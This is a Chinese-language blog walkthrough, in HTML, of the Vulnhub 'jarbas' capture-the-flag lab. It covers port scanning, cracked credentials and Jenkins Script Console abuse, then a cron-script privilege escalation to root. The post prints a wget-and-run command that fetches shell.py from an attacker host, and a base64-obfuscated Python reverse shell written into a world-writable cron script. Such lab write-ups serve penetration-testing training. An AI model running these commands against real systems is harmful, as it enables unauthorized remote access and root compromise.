@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="privilege_escalation,Jenkins,Crontab,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="思路 端口扫描, 整理思路 80端口, hash jenkins, 反弹shell crontab错误配置, get root shell">
+<meta name="keywords" content="privilege_escalation,Jenkins,Crontab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Challenging: jarbas">
+<meta property="og:url" content="https://exexute.github.io/2018/12/11/Vulnhub-Challenging-jarbas/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="思路 端口扫描, 整理思路 80端口, hash jenkins, 反弹shell crontab错误配置, get root shell">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://i2.bvimg.com/671004/6e051104726feecb.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/0a1d1a83374381d9.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/a4bc1e4bbb3a44d0.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/e8ddc285bf8a336a.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/6f28fcba784e0fcc.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/92a559ecfbbd3ea0.png">
+<meta property="og:image" content="http://i2.bvimg.com/671004/19efffa08ea82a53.png">
+<meta property="og:updated_time" content="2022-06-24T14:37:07.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Vulnhub Challenging: jarbas">
+<meta name="twitter:description" content="思路 端口扫描, 整理思路 80端口, hash jenkins, 反弹shell crontab错误配置, get root shell">
+<meta name="twitter:image" content="http://i2.bvimg.com/671004/6e051104726feecb.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2018/12/11/Vulnhub-Challenging-jarbas/">
+
+
+
+
+
+  <title>Vulnhub Challenging: jarbas | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2018/12/11/Vulnhub-Challenging-jarbas/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub Challenging: jarbas</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-11T19:28:41+08:00">
+                2018-12-11
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul>
+<li>端口扫描, 整理思路</li>
+<li>80端口, hash</li>
+<li>jenkins, 反弹shell</li>
+<li>crontab错误配置, get root shell<a id="more"></a>
+<h2 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h2></li>
+<li>jenkins获取反弹shell</li>
+<li>crontab配置</li>
+</ul>
+<h3 id="端口扫描-整理思路"><a href="#端口扫描-整理思路" class="headerlink" title="端口扫描, 整理思路"></a>端口扫描, 整理思路</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sS -Pn -p- -A 10.129.10.31</span><br></pre></td></tr></table></figure>
+<p><img src="http://i2.bvimg.com/671004/6e051104726feecb.png" alt="Markdown"><br>22端口, OpenSSH 7.4 CVE-2018-15473 用户枚举漏洞 搁置<br>80端口, Web服务 搁置<br>3306端口, MariaDB(unauthorized) 无远程漏洞 搁置<br>8080端口, Jetty WEB服务 优先考虑</p>
+<h3 id="80端口-hash"><a href="#80端口-hash" class="headerlink" title="80端口, hash"></a>80端口, hash</h3><p>访问8080端口, 发现是jenkins服务, 有用户名和密码且非弱密码, 搁置<br>访问80端口, 发现是一个很乱的站点, dirb扫目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ dirb http://10.129.10.31 -x /usr/share/wordlists/dirb/extensions_common.txt</span><br></pre></td></tr></table></figure></p>
+<p>发现access.html文件, 访问之后拿到三个用户名和对应的hash</p>
+<h3 id="jenkins-反弹shell"><a href="#jenkins-反弹shell" class="headerlink" title="jenkins, 反弹shell"></a>jenkins, 反弹shell</h3><p>拿到hash之后, 查询hash对应的明文, 得到三个用户名密码对<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tiago:italia99</span><br><span class="line">trindade:marianna</span><br><span class="line">eder:vipsu</span><br></pre></td></tr></table></figure></p>
+<p>构造用户名列表和密码列表爆破ssh和mysql, ssh无可用账号, mysql无法远程连接, 于是尝试登陆jenkins, 成功用eder:vipsu登陆jenkins</p>
+<p>登陆jenkins后, 进入<code>Script Console</code>获取反弹shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ println <span class="string">"wget http://10.129.10.32/shell.py -O /tmp/shell.py"</span>.execute().text</span><br><span class="line">$ println <span class="string">"python /tmp/shell.py"</span>.execute().text</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.bvimg.com/671004/0a1d1a83374381d9.png" alt="Markdown"></p>
+<p>拿到反弹shell<br><img src="http://i2.bvimg.com/671004/a4bc1e4bbb3a44d0.png" alt="Markdown"></p>
+<h3 id="crontab错误配置-get-root-shell"><a href="#crontab错误配置-get-root-shell" class="headerlink" title="crontab错误配置, get root shell"></a>crontab错误配置, get root shell</h3><p>拿到jenkins反弹的shell后, 上传LinEnum.sh, 运行之后发现crontab中存在一个自定义的文件:CleaningScript.sh<br><img src="http://i2.bvimg.com/671004/e8ddc285bf8a336a.png" alt="Markdown"></p>
+<p>查看该文件权限, 发现是777, 于是写入反弹shell<br><img src="http://i2.bvimg.com/671004/6f28fcba784e0fcc.png" alt="Markdown"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"python -c \"exec('aW1wb3J0IHNvY2tldCAgICxzdWJwcm9jZXNzICAgLG9zICAgICA7ICAgICAgIGhvc3Q9IjEwLjEyOS4xMC42MiIgICAgIDsgICAgICAgcG9ydD00NDQ0ICAgICA7ICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICxzb2NrZXQuU09DS19TVFJFQU0pICAgICA7ICAgICAgIHMuY29ubmVjdCgoaG9zdCAgICxwb3J0KSkgICAgIDsgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLDApICAgICA7ICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwxKSAgICAgOyAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsMikgICAgIDsgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp'.decode('base64'))\""</span> &gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure>
+<p>等待一段时间后, 拿到root权限的反弹shell<br><img src="http://i2.bvimg.com/671004/92a559ecfbbd3ea0.png" alt="Markdown"></p>
+<p>获取flag<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /root/flag.txt</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://i2.bvimg.com/671004/19efffa08ea82a53.png" alt="Markdown"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/privilege-escalation/" rel="tag"># privilege_escalation</a>
+          
+            <a href="/tags/Jenkins/" rel="tag"># Jenkins</a>
+          
+            <a href="/tags/Crontab/" rel="tag"># Crontab</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/09/密码破解工具最佳实践/" rel="next" title="密码爆破最佳实践">
+                <i class="fa fa-chevron-left"></i> 密码爆破最佳实践
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/13/VUlnhub-Challenging-Temple-of-doom-1/" rel="prev" title="Vulnhub Challenging: Temple of doom 1">
+                Vulnhub Challenging: Temple of doom 1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#思路"><span class="nav-number">1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关键点"><span class="nav-number">2.</span> <span class="nav-text">关键点</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#端口扫描-整理思路"><span class="nav-number">2.1.</span> <span class="nav-text">端口扫描, 整理思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#80端口-hash"><span class="nav-number">2.2.</span> <span class="nav-text">80端口, hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jenkins-反弹shell"><span class="nav-number">2.3.</span> <span class="nav-text">jenkins, 反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#crontab错误配置-get-root-shell"><span class="nav-number">2.4.</span> <span class="nav-text">crontab错误配置, get root shell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
